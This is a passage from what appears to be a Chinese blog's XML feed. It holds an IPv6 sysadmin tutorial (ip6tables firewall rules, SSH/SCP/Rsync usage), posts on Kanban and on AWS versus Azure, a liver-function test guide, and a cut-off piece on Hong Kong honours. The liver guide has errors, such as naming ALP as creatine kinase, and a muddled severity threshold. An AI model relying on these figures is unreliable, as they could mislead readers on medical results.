/etc/sysctl.conf:net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1##load your changes:$ sudo sysctl -pnet.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1##Test$ ping6 -c3 -I eth0 fe80::f07:3c7a:6d69:8d113 packets transmitted, 0 received, 100% packet loss, /time 2999s##Listing$ sudo ip6tables -L# Flushing$ sudo ip6tables -F Example Rules123456789101112131415161718192021222324252627282930313233# ip6tables single-host firewall script# Define your command variablesipt6=/sbin/ip6tables# Flush all rules and delete all chains# for a clean startup$ ipt6 -F$ ipt6 -X# Zero out all counters$ ipt6 -Z# Default policies: deny all incoming# Unrestricted outgoing$ ipt6 -P INPUT DROP$ ipt6 -P FORWARD DROP$ ipt6 -P OUTPUT ACCEPT# Must allow loopback interface$ ipt6 -A INPUT -i lo -j ACCEPT# Reject connection attempts not initiated from the host$ ipt6 -A INPUT -p tcp --syn -j DROP# Allow return connections initiated from the host$ ipt6 -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT# Accept all ICMP v6 packets$ ipt6 -A INPUT -p ipv6-icmp -j ACCEPT# Optional rules to allow other LAN hosts access to services. Delete $ipt6 -A INPUT -p tcp --syn -j DROP# Allow DHCPv6 from LAN only$ ipt6 -A INPUT -m state --state NEW -m udp -p udp -s fe80::/10 --dport 546 -j ACCEPT# Allow connections from SSH clients$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT# Allow HTTP and HTTPS traffic$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT$ ipt6 -A INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT# Allow access to SMTP, POP3, and IMAP$ ipt -A INPUT -m state --state NEW -p tcp -m multiport --dport 25,110,143 -j ACCEPT SSH and SCP我们熟悉的文件拷贝工具：SSH, SCP, 和 Rsync 都支持 IPv6，坏消息是他们的语法怪异。 所有 Linux 管理员都知道使用 SSH 和 SCP。 它们在 IPv6 网络中有一些怪异，特别是关于远程地址，一旦你弄明白这个问题就能像过去一样熟练使用 SSH 和 SCP 。默认情况下，sshd 守护进程同时监听 IPv4 和 IPv6 协议，你可以通过 netstat 查看：123456789101112$ sudo netstat -pant|grep sshdtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1228/sshd tcp6 0 0 :::22 :::* LISTEN 1228/sshd## 通过 sshd_config 中的 AddressFamily 选项禁用任何一种协议。禁用 IPv6:## 默认选项为 any ，只允许IPv6 inet6AddressFamily inet## 在客户端方面，通过 IPv6 网络登陆和 IPv4一样登陆、运行命令行以及退出。$ ssh carla@2001:db8::2$ ssh carla@2001:db8::2 backup## 您可以使用链路本地地址访问本地局域网上的主机。## 这有一个无正式文档说明的怪癖，会让你抓狂，但现在你知道它是什么：你必须把你的网络接口名称与远程地址用符号 “%” 连接。$ ssh carla@fe80::ea9a:8fff:fe67:190d%eth0 你也可以简化远程root登录。聪明的管理员禁用root登录ssh，所以你必须登录为一个普通用户，然后换为root用户登录。这不是那么费力，但我们可以用一个命令来完成这一切，系统将在倒数120分钟后停止！这个shutdown将持续打开直到完成运行，所以中途你能改变注意并且用寻常的方式取消shutdown，通过 Ctrl+c。 123456$ ssh -t carla@2001:db8::2 "sudo su - root -c 'shutdown -h 120'"carla@2001:db8::2 password:[sudo] password /for carla:Broadcast message from carla@remote-server## 技巧：强制使用 IPv4 或者 IPv6$ ssh -6 2001:db8::2 SCP是怪异的。你必须在链路本地地址的后面使用符号“%”来指定网络接口，并且将地址用方括号括起来，并避开括号；如果使用全球单播地址则不需要指定网络接口，但是依然需要方括号。123456789$ scp filename [fe80::ea9a:8fff:fe67:190d%eth0]:carla@fe80::ea9a:8fff:fe67:190d password:filename$ scp filename [2001:db8::2]:carla@2001:db8::2 password:filename## 示例：登录到远程主机上的不同用户帐户，指定将文件复制到的远程目录，并更改文件名：scp filename userfoo@[fe80::ea9a:8fff:fe67:190d%eth0]:/home/userfoo/files/filename_2 Rsyncrsync 要求使用各种标点符号封闭远程的 IPv6 地址。与以往一样，请记住源目录中的尾随斜杠，例如 /home/carla/files/ ，表示只复制目录的内容。省略尾随斜杠将复制目录及其内容。尾随斜线并不重要，关键是你的目标目录。12345678##全球单播地址不需要指定网络接口：$ rsync -av /home/carla/files/ &apos;carla@[2001:db8::2]&apos;:/home/carla/stuffcarla@f2001:db8::2 password:sending incremental file listsent 100 bytes received 12 bytes 13.18 bytes/sectotal size is 6,704 speedup is 59.86##使用链路本地地址时必须包含网络接口。$ rsync -av /home/carla/files/ &apos;carla@[fe80::ea9a:8fff:fe67:190d%eth0]&apos;:/home/carla/stuff Master: Carla SchroderCarla Schroder is a self-taught Linux and Windows sysadmin who laid hands on her first computer around her 37th birthday. Her first PC was a Macintosh LC II. Next came an IBM clone–a 386SX running MS-DOS 5 and Windows 3.1 with a 14-inch color display–which was adequate for many pleasant hours of Doom play. Then around 1997 she discovered Red Hat 5.0 and had a whole new world to explore. She is the author of the Linux Cookbook for O’Reilly, and writes Linux how-tos for several computer publications. 《Linux Cookbook》2004,$49.99 《Linux Networking Cookbook》2007,$44.99 《The Book of Audacity》2011,$34.95 扩展阅读参考文献 徐建锋：新贵与遗老续：IPv6的生而不活与IPv4的死而不僵 Carla Schroder@Linux.com:Building IPv6 Firewalls: IPv6 Security Myths Carla Schroder@Linux.com:Remote Sessions Over IPv6 with SSH, SCP, and Rsync Carla Schroder@Linux.com:How to Write iptables Rules for IPv6 Practical Networking for Linux Admins: TCP/IP Practical Networking for Linux Admins: Real IPv6 Practical Networking for Linux Admins: IPv4 and IPv6 LAN Addressing Practical Networking for Linux Admins: IPv6 Routing Cyber Security : TLS / SSL vs IPSec]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈:基于看板（Kanban）的管理实践]]></title>
    <url>%2F2017%2F08%2F06%2FTeamWork-Kanban%2F</url>
    <content type="text"><![CDATA[摘要Kanban看板是一种可视化生产管理系统，利用看板卡来增强信号量、标记生产过程，促进系统渐进式变化，提高团队协作的效率。 核心理论：流动性、可视化 实践方法：看板设计模式、可视化技巧、平衡群体智慧和个体差异 目标是 提高整个系统的生产能力，不只是提高任务的完成数量。——《凤凰项目 一个IT运维的传奇故事》第 193 页 一、Kanban看板核心理论1、起源Kanban(看板)是一种生产管理系统，起源于1940年代的丰田汽车公司的 TPS (Toyota Production System)。简单来说看板是一系列简单的视觉符号，它的出现是为了达到即时化生产（Just in time，JIT），JIT认为库存会带来成本以及浪费，而不是增加或储存价值，这与传统会计学不同，它鼓励企业逐步消除库存，以便削减生产流程中的成本，在管理中逐渐适应“零库存”的状态。 2、BASIC of Kanban：流动性Cycle Time = Work in Progress / ThroughputKanan 看板系统的基础理论是利特尔法则（ Little’s Law），由MIT （Sloan School of Management）的教授John Little于1961年提出：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。 the relationship between the average number of customers in a store, their arrival rate, and the average time in the store. 根据利特尔法则，跟踪工作及其进展的最重要的目标是：限制在制品（Work in process，WIP），例如尚未完成制造过程的商品，或是停留在库存仓库或是产线上，等待着进一步处理的商品。 高质量地完成工作只有在工作以可持续的节奏流动时才有可能。发现并维持这一节奏只有在在制品小于团队产能的情况下才有可能。— Jim Benson 《Personal Kanban》作者 看板的主要部分是故事卡片（Story Cards），上面显示了你和你的团队所需的所有必要信息。在基本设置中，故事卡片分为三个主要阶段（列）——To Do(计划做的事情）、In Progress (正在进行)、Done(完成)。根据实际的需要，还可以分为多个阶段。你也可以使用泳道任务（swimlanes）拆分为不同类别，最后根据进程随时移动状态和泳道之间的问题。 3、可视化工作区 The power of Little’s Law to Kanban teams is not its ability to predict WIP, Thoughput or Leadtime. The true power lies in its ability to influence team behavior with its underlying assumptions. 像看板这样的可视化系统因我们对视觉信息的偏好而成为了强有力的工具。真实地看到工作和流程有助于理解。看板墙可以作为一个简单的信息节点，使任何人都能走过来并了解项目的当前状态。— Jim Benson 《Personal Kanban》作者 看板方法要求团队将组织处理信号的规则显式化，利用精益度量体系对系统及时进行分析回顾，不断优化信号处理模式。这就形成了一个完整高效的反馈闭环，最终建立一个具备自我完善能力，并能随着组织发展和环境变化不断演进的自适应系统。— 李兴双 中国工商银行软件开发中心 Kanban看板可视化的一些技巧： Kanban看板墙需放置于工作区醒目位置 不同事件类别使用不同颜色，紧急事件（URGENT）使用醒目颜色（红色） 故事卡片常规要素：编号，标题，负责人，截止日期 故事卡片叠加要素：重要度，约束条件，延期原因等特殊描述 照相机定期快照（周），及时复盘总结（月） 限制进行中（In-Process）事件数量，限制已经完成（Done）事件数量（折叠或者更换新的Kanban看板墙） 总之，Kanban看板系统的本质意义在于促进团队成员对作业流程、过程和风险达成共同理解, 可视化的作用在于增强不确定风险的信息量（故障、阻碍因子、延期原因、特殊要求等），促进系统各方及时作出响应，或者通过快照机制随时复盘、研究改进措施。 二、Kanban看板实践注意事项1、看板墙设计模式 Conway’s law：Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure. 康威定律指出：任何组织在设计一套系统（广义概念上的系统）时，所交付的设计方案在结构上都与该组织的通信结构保持一致。设计一套可以落地的看板墙规则，第一个步骤不是按照教科书照搬其他企业的看板墙风格，而应首先画出自己所在组织的架构图。其内容包括管理架构、关联方和关注重点，在此基础之上再设计横坐标（Workflow）与纵坐标（Items）, 应当尽可能地使看板墙符合组织结构，而不是相反。 规模的增长很容易让工作陷入停滞，沟通成本加上工作划分会导致效率变化。具体表现为团队之间在工作时间里召开的沟通会议呈指数增长，不同团队的工作量差别很大，不同团队的工作节奏紊乱脱节。Kanban看板实践中，应考虑上述情况，在技术上作出特殊处理：例如当团队规模较大时，对看板墙进行拆分，不同的业务单元使用不同的看板，综合管控部门聚焦于较大标的，而技术实现部门侧重于细节。切记只有当工作可以划分时，你才可能通过增加团队成员来提高效率。 2、平衡群体智慧与个体差异 保持群体智慧的唯一方式是保护每个人的独立性。–乔纳-莱勒（Jonah Lehrer） 群体会对特定类型的问题给出较好的答案。当大量的人做出回应时，他们产生了很多答案，但其平均值、中位数或最常见的回答往往会是一个很好的答案。这比人们被彼此隔离来发表独立意见更为可行。……但是，当人们看到别人提供的答案后，就出现了一些不好的事情。人们会修改自己的答案，从而造成最后的答案集合变得不够多样化，这样最好的答案就可能无法脱颖而出。人们通过强化会变得更加自信，但是精确度却没有改进。群体智慧依赖于多样性和独立性。在社交网络上（以及在企业、组织和政府机构工作的人员团队中），同事压力和主导人物可能会降低该团体的智慧。（《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase） 具体落地实践中，需要承认不同团队、不同团队成员的个体差异。这里所说的个体差异主要表表现为性格差异，它通过人对事物的倾向性态度、意志、语言、逻辑、行为方式等方面表现出来。一般情况下，随机组成的团队成员之间，心理风格的差异会非常显著。例如在感知方面，可以划分为亢奋敏感型、被动感知型等；在信息反馈习惯上，存在主动型和滞后型；在计划性方面也有不同的偏好倾向，有人喜欢按部就班的任务模式，有人善于临机应变，处置紧急情况更能触发神经亢奋，然前者则容易陷入焦虑和挫败感。组织模式可以简化为两种，矩阵式：适用于团队成员之间技能、心理强度较为均匀的理想情况；另外一种是集中式：由一名心理风格较为平和的成员负责日常沟通、统一维护看板墙，即适当缓冲敏感型成员的过度信息输出，另外主动轮询其它被动型成员。 3、慎用“高级”看板不管什么时代什么组织，优秀管理的本质就是鼓励准确信息迅速向上、横向和向下传递，而最重要的是向上传递。在Kanban看板实践中，我目前的判断是不建议套用倾向量化方案的“高级”看板。 麦克纳马拉曾在福特汽车公司和五角大楼都创下管理奇迹的“神童”，在越南战争中使用量化准则来指挥越战，却导致越战的美军在结构上鼓励虚假信息向上传递：军队从上到下都渴望好消息，于是心照不宣地制造、传递假消息，甚至发明出所谓“尸体数”、“小便数”等荒唐可笑的考核指标，造成严重后果。麦克纳马拉也因为自己的过于“聪明”、刚愎自用，在战争决策上神话破产、风光不再。 “每个定量指标都表明我们正在打胜仗。— 麦克纳马拉” 量化的破坏性经常被人忽略：第一，机会成本。量化是很耗时的，大量宝贵的管理时间浪费在量化上，做其他重要事情的时间就减少了。第二，量化容易误导决策。定量信息造成了各种各样错得离谱的决策。 当你的组织还远远没有达到精益生产、杜绝延期的境界之前，将敏捷的Kanban看板应用急用进入量化范畴，是不明智的。 扩展阅读：DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 扩展阅读：Kanban 专题 Kanban 看板管理实践 ####《个人看板：了解工作/驾驭生活》（PersonalKanban:MappingWork|NavigatingLife） 作者：吉姆·本森、托尼安妮·德马里亚·巴里 简介：与其说这是一本关于复杂价值流的书，还不如说是一本关于个人工作效率的书。 ####《看板方法：科技企业渐进变革成功之道》 Kanban : Successful Evolutionary Change for Your Technology Business 作者：戴维·J.安德森 简介：对于在企业中如何使用看板图描述得更加具体。 参考文献 Marcus Hammarberg:Kanban in Action (Youtube Video) Steven Tomas:Little’s Law – the basis of Lean and Kanban PDF《kanban in Action》 Just-in-Time — Philosophy of complete elimination of waste 澎湃新闻：麦克纳马拉：以铁腕重塑五角大楼，却因越战一败涂地 何勉：解析精益产品开发（一）—— 看板开发方法]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>最佳工程实践</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cloud Computing 关于云计算]]></title>
    <url>%2F2017%2F07%2F23%2FCloudComputing%2F</url>
    <content type="text"><![CDATA[摘要 Stack Overflow：Trends in Cloud Computing：AWS or Azure ? 云计算平台的选择:AWS or Azure? 原文链接：Stack Overflow:Trends in Cloud Computing: Who Uses AWS, Who Uses Azure?(2017) 分析师 David Robinson：Data Scientist at Stack Overflow, works in R and Python. 工具：The Stack Overflow Trends tool。数据来源（Stack Overflow问题标签，时间跨度从2008至今）: amazon-web-services、azure。 Traffic to AWS and Azure over time 很明显，AWS和Azure两个平台在2012的流量水平相当，之后AWS增长得更快。 Technologies 开发者标签 AWS Azure 说明 C# 少 压倒性优势 Azure是微软产品，C#是Window技术栈中Web开发的默认选项 Node.js 多 多 Node.js开发者倾向于使用云托管 Python／Ruby Rails 多 少 C／C++ 很少 很少 很少部署在云应用 HTML 很少 很少 不负责配置云平台的前端开发人员和设计人员 By industryAWS的问题覆盖广泛，Azure在特定行业，特别是咨询和能源行业广泛使用的平台。进一步分析表明，这些行业是微软堆栈最受欢迎的行业。相比之下，AWS在技术行业（如软件和网络公司）尤其受欢迎，尤其是在媒体公司（包括出版和娱乐）。同样值得注意的是，“学术”部门、主要由学生和研究人员组成，这些用户访问的语言和技术与美国其他地区相比非常不同。这表明云平台在大学里并没有被广泛教授，或者在研究中广泛使用，至少与Python和R等技术相比。 By country 大部分国家的访问记录来看，关于AWS的问题数量要多于Azure的问题。但是有一个地方例外——荷兰，关于Azure的问题数量是AWS的两倍，一种可能的解释是微软在荷兰建了一个大型数据中心，导致该地区有相对较多的Azure平台开发者。Microsoft has built a major data center in the Netherlands 参考文献 Stack Overflow:Trends in Cloud Computing: Who Uses AWS, Who Uses Azure?(2017)]]></content>
      <tags>
        <tag>Economist</tag>
        <tag>架构师</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[医学：肝系统健康状态评价指标体系]]></title>
    <url>%2F2017%2F07%2F19%2FMedicine-Hepar%2F</url>
    <content type="text"><![CDATA[摘要 肝细胞损伤指标: ALT,AST,ALP,GGT 胆红素代谢指标 肝脏合成功能指标: 白蛋白(Alb) 肝纤维化指标 第一部分 肝系统状态指标的意义全面地反映肝脏功能状态，为肝功能异常的诊断提供重要线索，并能动态监测病情。 一、肝细胞损伤指标1.1 氨基转移酶水平（肝脏酶学检查） 谷丙转氨酶,ALT谷丙转氨酶（Alanine transaminase，简称 ALT）是一种转氨酶（存在于血浆及多种身体组织中，但最常见与肝脏关联)。也叫血清谷氨酸丙酮酸转氨酶（serum glutamate pyruvate transaminase，简称 SGPT）或丙氨酸转氨酶（alanine aminotransferase，简称 ALAT）。 谷丙转氨酶被用来确认肝脏的问题。谷丙转氨酶含量升高通常意味着病变的发生（例如，酒精肝或病毒性肝炎，充血性心力衰竭、肝损伤、胆管损伤，传染性单核细胞增多症或肌病等疾病）。但是不能作为唯一指标，因为一天内谷丙转氨酶的含量也会有正常的起伏，剧烈运动也可能导致 ALT 指标升高。 例如，由于肝细胞损伤导致的谷丙转氨酶含量升高，可以通过测量碱性磷酸酶与胆管损伤区别。同样，肌病也可以通过测量肌氨酸致活酶确定。 中等程度以下（1000U/L），提示存在大量肝细胞坏死，其最常见的疾病有急性病毒性肝炎、毒物或药物性肝损伤、急性缺血性肝病等。此外，重症自身免疫性肝炎和肝豆状核变性也能导致转氨酶急剧升高，但同时伴有自身免疫性抗体升高或铜代谢异常。 谷草转氨酶,AST谷草转氨酶即天冬氨酸氨基转移酶（Aspartate Transaminase，缩写 AST），是一种磷酸吡哆醛蛋白质，也可以作用于L-苯丙氨酸、L-酪氨酸和L-色氨酸。谷丙转氨酶主要发现于肝脏中，而谷草转氨酶在肝脏，心脏，骨骼肌，肾脏，大脑和红血球中都存在。 在大部分的肝脏疾病中，ALT 值比 AST 值高，也就是 AST/ALT 比值小于 1 。但是在和酒精有关的肝脏疾病中，AST/ALT 的比值经常大于2。这是因为A酒精会造成维生素 B6 缺乏，进而限制ALT的上升。如果 AST/ALT &gt; 3，并伴随着 GGT 异常上升（大于 60 U/L），有很大的概率是酒精引起的肝脏损伤，例如酒精性肝炎。 1.2 碱性磷酸酶（ALP）与 γ-谷氨酰转肽酶（GGT）血清碱性磷酸酶（ALP）可因以下原因升高： 脂肪膳食导致肠 ALP 水平增加而升高； 孕妇妊娠期间因胎盘合成也可能出现 ALP 水平升高； 儿童和老年人的 ALP 水平会升高，特别是50岁以上的女性，部分可能是由骨转换而来; 胆管阻塞使胆小管合成 ALP 增加，随后移位到肝血窦，使血清 ALP 水平升高。即使阻塞较小且不足以增加血清胆红素水平，也会引发上述情况。 γ-谷氨酰转肽酶（Gamma Glutamyltransferase , GGT） 主要分布于肾、肝、胰腺，但肾脏释放的GGT主要经尿液排出，血清 GGT 主要来自于肝脏。肝脏 GGT 主要分布于胆管上皮细胞和肝细胞膜管腔面，二者在发生变性和坏死时会导致GGT大量溶解释放入血，引起血清GGT升高。因此GGT升高提示肝脏疾病，尤其是 胆道 疾病。 γ-谷氨酰转肽酶（GGT）主要来自于肝脏，因此其可以用于辅助判断 碱性磷酸酶（ALP） 的来源：ALP 升高，GGT 正常，表明ALP来自于骨骼或肠道；若二者均升高，表明ALP来自肝脏，提示肝胆系统存在疾病。 1R 值 = [ALT/ALT正常范围上限] / [ALP/ALP正常范围上限] R值决定损伤是否是 肝细胞型（R≥5.0）， 胆汁淤积型（R≤2.0） 或混合型（2.0 &lt;R&lt;5.0） 1.3 胆红素代谢指标（胆红素代谢检查）胆红素由肝脏产生，经胆道排泄，肝在胆红素代谢中具有摄取、结合和排泄作用。胆红素是胆色素的一种，是人类胆汁的主要色素，呈橙黄色。它是体内血红素的主要代谢产物，有毒性，可对大脑和神经系统引起不可逆的损害，但也有抗氧化剂功能，可以抑制亚油酸和磷脂的氧化。 人体血液中的胆红素浓度增高，引起的皮肤、黏膜和眼球巩膜等部分发黄的症状，即黄疸(jaundice、icterus)黄胆，俗称黄病。当体内发生胆红素代谢障碍，例如胆红素生成过多，或肝摄取、转化、排泄过程发生障碍时，均可发生血浆胆红素浓度升高，造成高胆红素血症。由于胆红素为金黄色色素，血浆浓度过高时可以扩散进入组织，造成组织黄染。多种致病因素可引起血清胆红素升高导致黄疸，黄疸症可根据上述的血红素代谢过程分为三类： 肝前性黄疸/溶血性黄疸：当大量红血球被分解（如红细胞在单核吞噬细胞破坏过多）时出现的黄疸病症； 肝源性黄疸/肝细胞性黄疸：当肝脏无法正常处理胆红素（肝细胞被破坏，其摄取、转化和排泄胆红素的能力降低）时出现的黄疸病症； 肝后性黄疸/阻塞性黄疸：当肝脏无法正常排除胆红素（如胆汁排泄通道阻塞）时出现的黄疸病症； 某些胆囊病和血液病经常会引发黄疸的症状。 1总胆红素-直接胆红素=间接胆红素 间接型高胆红素血症间接胆红素升高是由于胆红素的产生过度（例如溶血）、肝重吸收减少或肝结合能力下降所致。间接胆红素升高最常见的原因是吉尔伯特综合征（肝功能不良、遗传性非溶血性高胆红素血症）。但其总胆红素水平几乎不超过6mg/dl，通常＜3 mg/dl。空腹或严重疾病可使间接胆红素升高2～3倍，相反，进食或服用苯巴比妥药物可降低间接胆红素水平。 直接型高胆红素血症通常意味着肝实质损伤或胆汁淤积导致胆红素进入胆管，以及胆红素从肝细胞进入血液循环减少。严重肝损伤（包括酒精性肝炎、肝硬化）患者的血清总胆红素水平可能超过 30 mg/dl，或可见于晚期肝硬化合并脓毒症或肾衰竭的患者中。 单纯高胆红素血症：可见于手术后，通常可以恢复。 三、肝脏合成功能指标（肝脏合成功能检查）3.1 白蛋白（Alb）肝脏是人体合成白蛋白（Alb）的 唯一 器官。合成后供机体需要，且几乎不被排出，其在血浆中的半衰期约为21d，因此 Alb 的高低反映肝脏合成代谢功能和储备功能，也是评估肝硬化严重程度及判断预后的指标。在正常饮食和肾功能正常情况下，Alb 降低可能与肝功能异常、肝脏合成蛋白质功能下降有关。Alb&lt;30 g/L 时部分患者出现或将要出现腹水，至25g/L以下时预后不良，降至20g/L时预后极差。 注意：由于 Alb 半衰期长，不能用于评估急性肝损伤。 3.2 凝血酶原时间（PT）血浆PT是评价肝脏合成功能的另一指标，该指标检测血液凝固时间，它需要肝脏产生的II、V、VII、IX因子的参与。当肝细胞广泛受损时，肝脏合成凝血因子的能力下降，导致PT延长。PT 超过3s以上为异常；4-6s时，表明严重的肝损伤且预后极差。在反应肝功能急性损伤方面，PT优于Alb。由于在肝脏疾病早期仅有 VII 因子合成减少，因此 PT 出现延长早于活化部分凝血激酶时间。 3.3 PA 和血清假性胆碱酯酶（PChE）二者均由肝脏合成，半衰期分别为1.9d和10d。PA由于半衰期短，能快速、敏感地反映肝细胞的损伤和肝脏的合成功能。研究表明急性肝炎时PA异常率为34%，而Alb异常率仅为17%，因此PA能更灵敏地反映肝细胞损伤，可作为判断急性肝损伤的灵敏指标。此外，动态监测PA能反映肝衰竭患者肝脏合成功能的好转或恶化情况，动态观察PA升高明显者预后好，降低或升高不明显者预后差，故观察PA早期动态变化能作为肝衰竭预后的判断指标之一。 四、肝纤维化指标透明质酸（HA）HA是一种分布在细胞外基质的氨基葡聚糖，主要由肝星状细胞或纤维母细胞合成，由窦状内皮细胞降解，在众多的肝纤维化指标中，HA的敏感性最高。急性肝炎时血清HA多正常，慢性肝炎或肝硬化时由于肝脏代谢能力下降，HA清除减少，使血清HA水平升高，并且其升高水平与肝脏炎症或肝纤维化程度呈正相关。 IV型胶原和层黏蛋白IV型胶原与层黏蛋白均是构成基底膜的主要成分，当肝脏持续损伤时，二者合成增加，而肝脏对其降解能力降低，出现毛细血管化。同时，血清中IV型胶原与层黏蛋白升高，且其升高程度与肝纤维化程度具有相关性。 肝系统状态指标体系氨基转移酶水平 ALT 谷丙转氨酶（3-35 U/L） AST 谷草转氨酶（15-40 U/L） 谷草／谷丙（0.91-2.25） GGT y-谷氨酰转移酶（10-60 U/L） ALP 磷酸肌酸激酶（24-184 U/L）(血清肌酸激酶测定-速率法) 特定疾病（乙型肝炎） HBV-DNA病毒定量(&lt;100) HBsAg 乙肝表面抗原定量（化学发光法） HbeAg 乙肝病毒e抗原 （&lt;1） Anti-HBe 乙肝病毒e抗体 （&gt;1） AFP 甲胎蛋白 （&lt;=20） 肝纤维化 脂肪肝（超声波） 肝脏硬度 (KPA) 脂肪衰减 (db/m) 血脂 总胆汁酸（0-14） TG 甘油三酯（0.45-1.70） TC 总胆固醇（2.90-5.18） LDL-CHO 低密度脂蛋白胆固醇（0-3.37） 肝脏合成功能标志物 总蛋白（61-81） 白蛋白（36-51） 球蛋白（25-35） 白蛋白／球蛋白（1.2-2.5） 胆红素标志物（黄疸常规） 总胆红素（4-23.9） 直接胆红素（0-6.8） 间接胆红素（2.6-20.9） 肝损伤原因分类1、药物性肝损伤 DILI药物性肝损伤，药物性肝炎（Drug-Induced Liver Injury，DILI），简称药肝，是指在使用某种或几种药物之后，由于药物本身或其代谢产物而引起的不同程度的肝脏损伤，亦或是由于特殊体质对药物的超敏感性或耐受性降低所导致的肝脏损伤或炎症。 FDA已确认数个由营养补充剂引起的肝脏损害实例。为此，FDA已对公众发出警告和去信减肥和健美产品制造商警告。如一个德克萨斯州公司发现本公司产品与肝损害和非病毒性肝炎有关后，同意召回并销毁了某些营养补充剂产品。 2、病毒性肝炎HAV感染：抗-HAV-IgMHBV感染：HBsAg，抗-HBc-IgM，HBV DNAHCV感染：抗-HCV，HCV RNAHEV感染：抗-HEV-IgM，抗-HEV-IgG，HEV RNA 3、酒精性肝炎肝胆超声波成像/肝血管彩色多普勒成像/腔内超声检查/CT/MRC酒精中毒（AST/ALT ≥2）近期有急性低血压病史（尤其是在有潜在心脏疾病时） 4、自身免疫性肝炎 自身免疫性肝炎 遗传性肝病 其它合并脓毒症、转移性恶性肿瘤、原发性胆汁性胆管炎或原发性硬化性胆管炎 CMV感染：抗-CMV-IgM，抗-CMV-IgG，CMV-PCREBV感染：抗-EBV-IgM，抗-EBV-IgG，EBV-PCRHSV感染：抗-HSV-IgM，抗-HSV-IgG，HSV-PCRVZV感染：抗-VZV-IgM，抗-VZV-IgG，VZV-PCR 附表：名词解释 预后(Prognosis、outcomes，别称：愈后），指根据病人当前状况来推估未来经过治疗后可能的结果。医生通常需要根据病人病情相关因素（如：疾病种类、症状、病情分期、病理图像、基因、并发症、年龄等）而对未来治疗结果所做的完全的预估。 附表：新陈代谢图 （美国）药物性肝损伤专业网站 （中国）药物性肝损伤专业网站 | 上海交通大学医学院附属仁济医院 扩展阅读嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 扩展阅读 药物警告-持续更新 | 药物性肝损伤的专业网站 参考文献 肝功能评价体系现状和研究进展 Reason@医脉通肝脏科:常见的肝脏生化检查及其临床意义 RUCAM 量表 | 药物性肝损伤专业网 从药到毒| 药物性肝损伤专业网 一文回顾 | 胆红素概述及黄疸的分类|原创 2017-11-18 Reason 医脉通肝脏科 名家视点丨肝脏硬度与肝细胞癌风险|原创 2017-12-19 黄丽虹 国际肝病 脂肪肝是怎么诊断的 | 2018-02-27 谭友文 老谭说肝病 黄疸患者饮食有讲究：如何吃出健康的肝脏？原创 2018-03-23 Reason 医脉通肝脏科]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[太公分猪肉--香港特区授勋及嘉奖制度观察]]></title>
    <url>%2F2017%2F07%2F14%2FMedal-HK%2F</url>
    <content type="text"><![CDATA[摘要 香港勋衔文化源流 香港特区勋章体系 颁授和褫夺程序 现行嘉奖制度弊端 香港勋衔文化源流香港的勋衔文化可能源于港英时期的太平绅士（Justice of the Peace，JP，也译作治安法官）。它是一种源于英国，由政府委任民间人士担任维持社区安宁、防止非法刑罚及处理一些较简单的法律程序的职衔，多半是在适用英美法系的国家或是曾使用英美法系的地区。1843年，首任港督砵甸乍特选了44位社会人士成为治安委员，组成“英属香港治安委员会”。及后，“治安委员”扩大权利及易名为“太平绅士”。早期香港的太平绅士全属英国洋人，及至1878年12月14日伍廷芳获港督轩尼诗委任为首名华人太平绅士。自此，不少华人陆续被委任为太平绅士。立法局于1997年5月通过《太平绅士条例》（香港法例510章），从而确定了太平绅士在香港回归后的法律地位。 太平绅士分为两类，一类是官守成员：通常是副署长、副秘书长或助理署长以上政务官、十八区民政事务专员，官守成员从相关岗位离职后自动卸任。另一类非官守成员：由政务司长主持的遴选委员会提名推荐、之后由行政长官正式批准，无特定条件，一般要求热心社区公益或卓有贡献。太平绅士在香港民间声望颇高，早期可以参与审理轻微案件，也可以参与政府施政建议、巡视监狱、监督六合彩开奖等等。 香港特区勋章体系目前香港特别行政区的勋章体系大体分为N大类别：成就勋章（紫荆勋章系列和荣誉勋章）、烈士勋章（英勇勋章系列）、纪律部队奖章（警察、消防、海关及廉政公署奖章系列）和行政长官奖状（社区服务和公共服务系列）。 一、成就勋章（紫荆勋章系列和荣誉勋章） (a) 大紫荆勋章(GBM)香港特别行政区授勋及嘉奖制度下的最高荣誉，表扬毕生为香港作出重大贡献的人士。 (b) 紫荆星章颁授予长期致力服务公众而成绩斐然，或在所属行业有卓越成就的人士。三个等级勋章的甄选准则分别为：(i) 金紫荆星章(GBS)颁授予对社会有重大贡献或积极参与公共或志愿服务而得到极高评价的人士；(ii) 银紫荆星章(SBS)是颁授予长期担任公共事务及志愿工作的领导人物；(iii) 铜紫荆星章(BBS)是颁授予长期服务社会并有杰出表现的人士。与银紫荆星章比较，获授铜紫荆星章的人士所提供的服务比较局限于个别范畴或方式。 (c) 荣誉勋章(MH)授勋制度下的基本勋衔，自1998年起开始颁授。用以表扬在 地区或某个范畴 长期为社区服务的人士。这勋章亦颁授予表现优异的 非首长级公务员。 